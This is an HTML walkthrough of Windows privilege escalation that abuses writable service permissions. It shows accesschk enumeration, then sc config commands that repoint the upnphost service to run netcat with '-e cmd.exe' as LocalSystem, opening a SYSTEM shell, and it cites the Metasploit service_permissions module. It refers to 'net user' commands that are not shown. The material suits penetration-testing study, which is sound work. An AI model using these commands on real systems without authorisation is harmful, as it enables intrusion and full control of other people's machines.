<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Walkthrough</title>
</head><body>Check access rights. Grab <a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">accesschk.exe</a>from Sysinternals. Accesschk can automatically check if we have write access to a Windows service with a certain user level. <br/>
Generally as a low privilege user we will want to check for &quot;Authenticated Users&quot;. Make sure to check which user groups you user belongs to, &quot;Power Users&quot; for example is considered a low privilege user group (though it is not widely used). <br/>
<br/>
Look for Write access to a service in order to reconfigure it to gain elevated access. <br/>
Also look for SERVICE_START_NAME: LocalSystem which means the service will run the command as SYSTEM<br/>
<br/>
<br/>
# We can use sc to query, configure and manage windows services.<br/>
C:\Windows\system32&gt; sc qc Spooler<br/>
<br/>
# We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list for a specific service<br/>
# Remember, first time running accesschk.exe also use /accepteula<br/>
C:\&gt; accesschk.exe -ucqv Spooler<br/>
<br/>
# You can enum all services that can be modified with<br/>
C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *<br/>
<br/>
<span style="font-family: inherit">C:\&gt; accesschk.exe -ucqv upnphost<br/>
<br/>
upnphost<br/>
<br/>
 RW NT AUTHORITY\SYSTEM<br/>
    SERVICE_ALL_ACCESS<br/>
 RW BUILTIN\Administrators<br/>
    SERVICE_ALL_ACCESS<br/>
<b> RW NT AUTHORITY\Authenticated Users<br/>
</b><b>    SERVICE_ALL_ACCESS</b><br/>
 RW BUILTIN\Power Users<br/>
    SERVICE_ALL_ACCESS<br/>
 RW NT AUTHORITY\LOCAL SERVICE<br/>
    SERVICE_ALL_ACCESS<br/>
</span><br/>
<img src="image 2.png"/><br/>
<br/>
sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;<br/>
#This changes the SERVICE_START_NAME<br/>
sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;<br/>
sc qc upnphost<br/>
net start upnphost<br/>
<br/>
<br/>
The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
<br/>
The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously &quot;Power Users&quot; is also considered to be a low privileged user group. &quot;Power Users&quot; have their own set of vulnerabilities, Mark Russinovich has written a very interesting <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">article</a>on the subject.<br/>
<br/>
Metasploit module: exploit/windows/local/service_permissions<br/>
	1. Tries to create and start a service<br/>
	2. Attempts to change binpath of a service and restart<br/>
	3. See if binpath exe file's folder is writeable, create a new exe and restar the service<br/>
<br/>
</body></html>